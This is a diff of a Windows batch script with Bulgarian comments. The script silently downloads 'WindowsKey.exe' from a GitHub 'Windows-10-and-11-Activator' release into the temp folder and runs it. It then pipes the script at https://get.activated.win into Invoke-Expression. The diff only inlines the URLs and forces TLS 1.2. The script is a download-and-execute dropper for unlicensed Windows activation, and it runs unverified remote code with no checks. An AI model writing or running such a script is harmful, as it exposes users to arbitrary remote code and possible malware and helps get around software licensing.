@@ -1,17 +1,12 @@
 @echo off
 
-:: Първи URL за изтегляне
-set "url1=https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe"
-:: Втори URL за изпълнение
-set "url2=https://get.activated.win"
-
-:: Сваляне и стартиране на първия файл
+:: Изтегляне на файл с алтернативен метод
 powershell -Command ^
-    "$ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri '%url1%' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
+    "$ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/betamod9/Windows-10-and-11-Activator/releases/download/12.27.2024/WindowsKey.exe' -OutFile $env:TEMP\\WindowsKey.exe; Start-Process $env:TEMP\\WindowsKey.exe"
 
-:: Изчакване, за да се стартира първият файл
+:: Изчакване
 timeout /t 5 /nobreak >nul
 
 :: Изпълнение на втория URL
 powershell -Command ^
-    "$ProgressPreference = 'SilentlyContinue'; irm '%url2%' | iex"
+    "$ProgressPreference = 'SilentlyContinue'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod 'https://get.activated.win' | Invoke-Expression"
